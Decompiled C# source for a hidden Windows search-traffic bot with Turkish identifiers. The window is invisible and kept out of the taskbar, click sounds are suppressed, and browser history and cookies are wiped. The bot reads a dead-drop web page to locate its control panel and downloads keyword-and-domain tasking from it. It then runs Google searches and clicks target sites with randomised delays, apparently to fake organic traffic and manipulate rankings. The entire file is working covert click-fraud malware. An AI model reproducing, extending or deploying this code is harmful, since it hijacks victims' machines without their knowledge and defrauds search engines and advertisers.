using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace browser_bastan;

public class Form1 : Form
{
	private delegate void SureliFonksiyon();

	private const int GWL_EXSTYLE = -20;

	private const int WS_EX_TOOLWINDOW = 128;

	private const int INTERNET_OPTION_END_BROWSER_SESSION = 42;

	private IContainer components;

	private WebBrowser webBrowser1;

	private string ana;

	private string baba;

	private Queue<KeyValuePair<string, string>> kelimelistesi;

	private string kelime;

	private string domain;

	private int suankisayfa;

	private Dictionary<string, bool> gezilenler;

	private Random rnd;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		webBrowser1 = new WebBrowser();
		((Control)this).SuspendLayout();
		((Control)webBrowser1).set_Dock((DockStyle)5);
		webBrowser1.set_IsWebBrowserContextMenuEnabled(false);
		((Control)webBrowser1).set_Location(new Point(0, 0));
		((Control)webBrowser1).set_Name("webBrowser1");
		webBrowser1.set_ScriptErrorsSuppressed(true);
		((Control)webBrowser1).set_Size(new Size(761, 488));
		((Control)webBrowser1).set_TabIndex(0);
		webBrowser1.set_WebBrowserShortcutsEnabled(false);
		webBrowser1.add_DocumentCompleted(new WebBrowserDocumentCompletedEventHandler(webBrowser1_DocumentCompleted));
		webBrowser1.add_NewWindow((CancelEventHandler)webBrowser1_NewWindow);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(761, 488));
		((Control)this).get_Controls().Add((Control)(object)webBrowser1);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	[DllImport("user32.dll")]
	public static extern bool SetForegroundWindow(IntPtr hWnd);

	[DllImport("user32.dll")]
	public static extern int SetWindowLong(IntPtr window, int index, int value);

	[DllImport("user32.dll")]
	public static extern int GetWindowLong(IntPtr window, int index);

	[DllImport("winmm.dll")]
	public static extern int sndPlaySound(string lpszSoundName, int uFlags);

	[DllImport("wininet.dll", SetLastError = true)]
	private static extern bool InternetSetOption(IntPtr hInternet, int dwOption, IntPtr lpBuffer, int lpdwBufferLength);

	public Form1()
	{
		Class2.KAI9ndrzp23w0();
		ana = "http://www.nurullahuzmez.com";
		baba = "http://[DEGISTIR]/v/v.php";
		kelimelistesi = new Queue<KeyValuePair<string, string>>();
		suankisayfa = 1;
		gezilenler = new Dictionary<string, bool>();
		rnd = new Random();
		((Form)this)._002Ector();
		InitializeComponent();
	}

	private void webBrowser1_NewWindow(object sender, CancelEventArgs e)
	{
		e.Cancel = true;
	}

	private void Basla()
	{
		DeleteCache();
		try
		{
			suankisayfa = 1;
			KeyValuePair<string, string> keyValuePair = kelimelistesi.Dequeue();
			kelime = keyValuePair.Key;
			domain = keyValuePair.Value;
			while (webBrowser1.get_IsBusy())
			{
				Thread.SpinWait(10000);
			}
			webBrowser1.Navigate("http://www.google.com.tr/advanced_search");
		}
		catch (InvalidOperationException)
		{
			Environment.Exit(-1);
		}
	}

	private void KelimeleriCek()
	{
		using WebClient webClient = new WebClient();
		string text = "";
		try
		{
			text = webClient.DownloadString(baba);
		}
		catch (Exception)
		{
			Environment.Exit(-1);
		}
		string[] array = text.Split(new char[1] { '\n' });
		string[] array2 = array;
		foreach (string text2 in array2)
		{
			string[] array3 = text2.Trim().Split(new char[1] { '|' });
			try
			{
				string text3 = array3[1];
				string key = array3[0];
				KeyValuePair<string, string> item = new KeyValuePair<string, string>(key, text3);
				gezilenler.Add(text3, value: false);
				kelimelistesi.Enqueue(item);
			}
			catch
			{
			}
		}
	}

	private void ButonTikla(string attribute, string value)
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		if (!(webBrowser1.get_Document() != (HtmlDocument)null))
		{
			return;
		}
		HtmlElementCollection elementsByTagName = webBrowser1.get_Document().GetElementsByTagName("input");
		foreach (HtmlElement item in elementsByTagName)
		{
			HtmlElement val = item;
			if (val.GetAttribute(attribute).Contains(value))
			{
				val.RaiseEvent("onmouseover");
				val.RaiseEvent("onmousedown");
				val.InvokeMember("click");
			}
		}
	}

	private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		string text = e.get_Url().ToString();
		if (text == "http://www.google.com.tr/advanced_search")
		{
			SureliIslet(delegate
			{
				TextBoxYaz("name", "as_q", kelime);
				SureliIslet(delegate
				{
					ButonTikla("value", "Arama Yap");
				}, 4000, 5000);
			}, 2000, 4000);
		}
		else if (text.StartsWith("http://www.google.com.tr/search?as_q=") && !text.Contains("start="))
		{
			SureliIslet(delegate
			{
				if (!LinkeTikla(domain))
				{
					SureliIslet(Ilerle, 5000, 12000);
				}
			}, 3000, 6000);
		}
		else if (text.StartsWith("http://www.google.com.tr") && text.Contains("start="))
		{
			SureliIslet(delegate
			{
				if (!LinkeTikla(domain))
				{
					SureliIslet(Ilerle, 5000, 12000);
				}
			}, 3000, 6000);
		}
		else
		{
			if (!text.Contains(domain) || text.StartsWith("http://www.google.com"))
			{
				return;
			}
			SureliIslet(delegate
			{
				if (!gezilenler[domain])
				{
					gezilenler[domain] = true;
					RastGeleGez();
				}
			}, 20000, 50000);
		}
	}

	private void Ilerle()
	{
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Expected O, but got Unknown
		suankisayfa++;
		HtmlElementCollection links = webBrowser1.get_Document().get_Links();
		foreach (HtmlElement item in links)
		{
			HtmlElement val = item;
			if (val.get_OuterText() == suankisayfa.ToString() || val.get_OuterText() == suankisayfa + " ")
			{
				val.RaiseEvent("onmouseover");
				val.RaiseEvent("onmousedown");
				val.InvokeMember("click");
			}
		}
	}

	private void RastGeleGez()
	{
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Expected O, but got Unknown
		if (!(webBrowser1.get_Document() != (HtmlDocument)null))
		{
			return;
		}
		HtmlElementCollection elementsByTagName = webBrowser1.get_Document().GetElementsByTagName("a");
		List<HtmlElement> list = new List<HtmlElement>(elementsByTagName.get_Count());
		if (elementsByTagName.get_Count() > 0)
		{
			foreach (HtmlElement item in elementsByTagName)
			{
				HtmlElement val = item;
				if (val.GetAttribute("target") != "_blank" && !string.IsNullOrEmpty(val.get_InnerText()) && NormalLink(val.GetAttribute("href")))
				{
					list.Add(val);
				}
			}
			if (list.Count > 0)
			{
				list[rnd.Next(list.Count - 1)].RaiseEvent("onmouseover");
				list[rnd.Next(list.Count - 1)].RaiseEvent("onmousedown");
				list[rnd.Next(list.Count - 1)].InvokeMember("click");
				list.Clear();
			}
		}
		SureliIslet(delegate
		{
			SureliIslet(Basla, 180001, 181000);
		}, 5000, 6000);
	}

	private bool NormalLink(string url)
	{
		if (!url.EndsWith("xml") && !url.EndsWith("@") && !url.EndsWith("SetHomePage") && !url.EndsWith("AddFavorite") && !url.EndsWith(".jpg") && !url.EndsWith(".gif") && !url.EndsWith(".png") && !url.EndsWith(".rar") && !url.EndsWith(".zip") && !url.EndsWith(".vcf") && !url.EndsWith(".exe") && !url.EndsWith(".mp3") && !url.EndsWith(".mp4"))
		{
			return !url.EndsWith("mailto");
		}
		return false;
	}

	private void DeleteCache()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "RunDll32.exe";
		processStartInfo.Arguments = "InetCpl.cpl,ClearMyTracksByProcess 1";
		Process process = Process.Start(processStartInfo);
		process.WaitForExit();
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
		processStartInfo2.FileName = "RunDll32.exe";
		processStartInfo2.Arguments = "InetCpl.cpl,ClearMyTracksByProcess 8";
		Process process2 = Process.Start(processStartInfo2);
		process2.WaitForExit();
		InternetSetOption(IntPtr.Zero, 42, IntPtr.Zero, 0);
	}

	private void TextBoxYaz(string att, string attname, string attvalue)
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		if (!(webBrowser1.get_Document() != (HtmlDocument)null))
		{
			return;
		}
		HtmlElementCollection elementsByTagName = webBrowser1.get_Document().GetElementsByTagName("input");
		foreach (HtmlElement item in elementsByTagName)
		{
			HtmlElement val = item;
			if (val.GetAttribute(att).Equals(attname))
			{
				val.SetAttribute("value", attvalue);
			}
		}
	}

	private bool LinkeTikla(string url)
	{
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Expected O, but got Unknown
		bool result = false;
		List<string> list = new List<string>();
		if (webBrowser1.get_Document() != (HtmlDocument)null)
		{
			HtmlElementCollection links = webBrowser1.get_Document().get_Links();
			{
				foreach (HtmlElement item in links)
				{
					HtmlElement val = item;
					string attribute = val.GetAttribute("href");
					list.Add(attribute);
					if (!attribute.Contains("//webcache.googleusercontent.com") && !attribute.Contains("&amp;q=related:") && val.GetAttribute("href").Contains(url))
					{
						val.RaiseEvent("onmouseover");
						val.RaiseEvent("onmousedown");
						val.InvokeMember("Click");
						return true;
					}
				}
				return result;
			}
		}
		return result;
	}

	private void SureliIslet(SureliFonksiyon x, int min, int max)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		_003C_003Ec__DisplayClassf CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClassf();
		CS_0024_003C_003E8__locals0.x = x;
		Timer val = new Timer();
		val.set_Interval(rnd.Next(min, max));
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate(object sender, EventArgs e)
		{
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Expected O, but got Unknown
			CS_0024_003C_003E8__locals0.x();
			((Timer)sender).Stop();
			((Component)(Timer)sender).Dispose();
		});
		val2.Start();
	}

	private void PanelAyarla()
	{
		string newValue = "";
		WebHeaderCollection webHeaderCollection = new WebHeaderCollection();
		webHeaderCollection.Add("User-Agent", "Mozilla/4.0 (compatiple; MSIE 6.0; Windows NT 5.1)");
		WebHeaderCollection headers = webHeaderCollection;
		WebClient webClient = new WebClient();
		webClient.Encoding = Encoding.Default;
		webClient.Headers = headers;
		using (WebClient webClient2 = webClient)
		{
			try
			{
				string input = webClient2.DownloadString(ana);
				Regex regex = new Regex("1(.*?)2", RegexOptions.IgnoreCase | RegexOptions.Compiled);
				Match match = regex.Match(input);
				newValue = match.Groups[1].ToString();
			}
			catch (Exception)
			{
				Environment.Exit(-1);
			}
		}
		baba = baba.Replace("[DEGISTIR]", newValue);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Size(new Size(rnd.Next(1280, 1366), rnd.Next(600, 700)));
		int windowLong = GetWindowLong(((Control)this).get_Handle(), -20);
		SetWindowLong(((Control)this).get_Handle(), -20, windowLong | 0x80);
		ieKontrol();
		PanelAyarla();
		KelimeleriCek();
		Araclar.DisableClickSounds();
		Basla();
	}

	private void ieKontrol()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		WebBrowser val = new WebBrowser();
		Version version = val.get_Version();
		if (version.Major < 7)
		{
			Environment.Exit(-1);
		}
		val = null;
	}
}
